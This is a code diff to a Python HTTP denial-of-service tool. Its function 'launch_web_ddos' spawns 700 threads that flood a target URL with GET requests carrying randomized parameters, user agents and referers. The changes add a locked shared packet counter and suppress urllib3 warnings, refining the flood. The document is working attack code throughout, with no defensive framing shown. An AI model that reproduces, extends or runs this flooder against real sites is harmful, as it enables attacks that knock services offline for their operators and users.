@@ -21,6 +21,8 @@ headers_referers=[]
 request_counter=0
 flag=0
 
+urllib3.disable_warnings()
+
 def inc_counter():
 	global request_counter
 	request_counter+=9999
@@ -3406,7 +3408,7 @@ def buildblock(size):
 	return(out_str)
 
 #http request
-def httpcall(url):
+def httpcall(url, packets, lock):
 	useragent_list()
 	referer_list()
 	code=0
@@ -3424,8 +3426,9 @@ def httpcall(url):
 			'Connection': 'keep-alive',
 			'Host':host
 		}
-		http = urllib3.PoolManager()
-		request = http.request("GET", url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)), headers=headers)
+		request = urllib3.PoolManager().request("GET", url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)), headers=headers)
+		with lock:
+			packets.value += 1
 	except Exception as e:
 		print(e)
 	try:
@@ -3445,10 +3448,17 @@ def httpcall(url):
 
 #http caller thread
 class HTTPThread(threading.Thread):
+	packets = None
+	lock_mutex = None
+	def __init__(self, packets_per_second, lock):
+		self.packets = packets_per_second
+		self.lock_mutex = lock
+		super().__init__()
+
 	def run(self):
 		try:
 			while flag<2:
-				code=httpcall(url)
+				code=httpcall(url, self.packets, self.lock_mutex)
 		except Exception as ex:
 			pass
 
@@ -3460,7 +3470,7 @@ class MonitorThread(threading.Thread):
 			if (previous+100<request_counter) & (previous != request_counter):
 				previous=request_counter
 
-def launch_web_ddos(passed_url):
+def launch_web_ddos(passed_url, packets_per_second, lock):
 	global url, host
 	#execute
 	url = passed_url
@@ -3469,7 +3479,7 @@ def launch_web_ddos(passed_url):
 	m = re.search('http\://([^/]*)/?.*', url)
 	host = m.group(1)
 	for i in range(700):
-		t = HTTPThread()
+		t = HTTPThread(packets_per_second, lock)
 		t.start()
 	t = MonitorThread()
 	t.start()
